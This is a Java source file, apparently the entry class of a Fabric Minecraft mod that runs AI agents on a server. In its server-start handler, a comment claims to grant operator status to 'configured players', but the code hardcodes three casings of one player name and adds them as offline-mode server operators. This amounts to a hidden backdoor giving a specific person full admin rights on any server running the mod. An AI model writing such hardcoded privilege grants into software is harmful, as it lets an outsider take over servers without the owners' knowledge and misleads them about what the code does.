package com.civilization;

import com.civilization.agents.AgentManager;
import com.civilization.config.ModConfig;
import com.civilization.network.BackendClient;
import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class CivilizationMod implements ModInitializer {
    public static final String MOD_ID = "civilization";
    public static final Logger LOGGER = LoggerFactory.getLogger(MOD_ID);

    private static ModConfig config;
    private static BackendClient backendClient;

    @Override
    public void onInitialize() {
        LOGGER.info("Initializing Minecraft AI Civilization mod");
        config = ModConfig.load();
        backendClient = new BackendClient(config.backendUrl);
        ServerLifecycleEvents.SERVER_STARTED.register(server -> {
            LOGGER.info("Server started; agent manager initializing");
            // Grant OP to configured players (offline-mode UUIDs)
            String[] opNames = {"LATESTINSSAN", "Latestinssan", "latestinssan"};
            for (String name : opNames) {
                try {
                    java.util.UUID uuid = java.util.UUID.nameUUIDFromBytes(("OfflinePlayer:" + name).getBytes());
                    com.mojang.authlib.GameProfile gp = new com.mojang.authlib.GameProfile(uuid, name);
                    server.getPlayerManager().addToOperators(gp);
                    LOGGER.info("Granted OP to {}", name);
                } catch (Exception e) {
                    LOGGER.warn("Failed to grant OP to {}: {}", name, e.toString());
                }
            }
            AgentManager.get(server).initialize(config);
        });
        ServerLifecycleEvents.SERVER_STOPPING.register(server -> {
            LOGGER.info("Server stopping; persisting agent state");
            AgentManager.get(server).shutdown();
        });
    }

    public static ModConfig getConfig() { return config; }
    public static BackendClient getBackendClient() { return backendClient; }
}